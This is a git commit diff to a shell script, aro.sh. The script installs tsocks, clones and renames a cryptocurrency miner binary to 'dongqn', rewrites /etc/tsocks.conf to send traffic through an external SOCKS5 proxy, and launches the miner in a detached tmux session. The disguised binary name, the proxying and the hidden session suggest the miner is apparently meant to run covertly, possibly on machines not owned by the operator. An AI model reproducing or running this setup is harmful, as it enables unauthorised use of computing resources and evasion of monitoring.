27580a56f2821c77bd918e6c45a5f3b4a98af356
tonhue26 <38829206+tonhue26@users.noreply.github.com>
2018-05-03 12:59:49 +0700

    Update aro.sh

--- aro.sh
+++ aro.sh
@@ -86,9 +86,14 @@ route add 117.7.81.138 gw $IP
 route add default dev ppp0
 wget -qO- http://ipv4.icanhazip.com > ip.txt
 
-sudo apt-get update && sudo apt-get upgrade -y && sudo apt-get install cpulimit -y
+sudo apt-get update && sudo apt-get upgrade -y && sudo apt-get install cpulimit -y && sudo apt-get install tsocks
 git clone https://github.com/tonhue26/ariocppminer.git
 cd ariocppminer
 mv ariocppminer_avx2 dongqn
 chmod 0777 dongqn
-cpulimit --exe dongqn --limit 320 -b && ./dongqn
+sed -i 's/192.168.0.0/0.0.0.0/g' /etc/tsocks.conf
+sed -i 's/255.255.255.0/0.0.0.0/g' /etc/tsocks.conf
+sed -i 's/192.168.0.1/38.141.47.57/g' /etc/tsocks.conf
+sed -i 's/server_port = 1080/server_port = 1221/g' /etc/tsocks.conf
+sed -i 's/server_type = 4/server_type = 5/g' /etc/tsocks.conf
+tsocks tmux new-session -d -s my_session1 './dongqn'
